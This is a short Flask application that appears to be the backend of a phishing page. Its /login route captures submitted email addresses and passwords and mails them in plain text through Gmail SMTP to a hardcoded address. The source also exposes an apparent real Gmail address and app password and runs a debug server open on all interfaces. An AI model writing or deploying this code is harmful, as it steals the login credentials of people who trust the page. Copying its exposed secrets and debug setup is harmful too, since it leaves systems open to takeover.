from flask import Flask, render_template, request, redirect, url_for, flash
from flask_mail import Mail, Message
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Configure mail settings for Gmail
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'matthewtownsend451@gmail.com'  # Your Gmail email address
app.config['MAIL_PASSWORD'] = 'qruoyvpfmufpotvj'  # Your Gmail password or App Password

mail = Mail(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    recipients = [
        app.config['MAIL_USERNAME'],  # Your main email
           # Additional email
    ]

    try:
        # Send email with login details to multiple recipients
        msg = Message('Login Details', sender=app.config['MAIL_USERNAME'], recipients=recipients)
        msg.body = f'Email: {email}\nPassword: {password}'
        mail.send(msg)
        flash('Login details sent successfully.', 'success')
    except Exception as e:
        flash(f'Failed to send email. Error: {str(e)}', 'error')

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)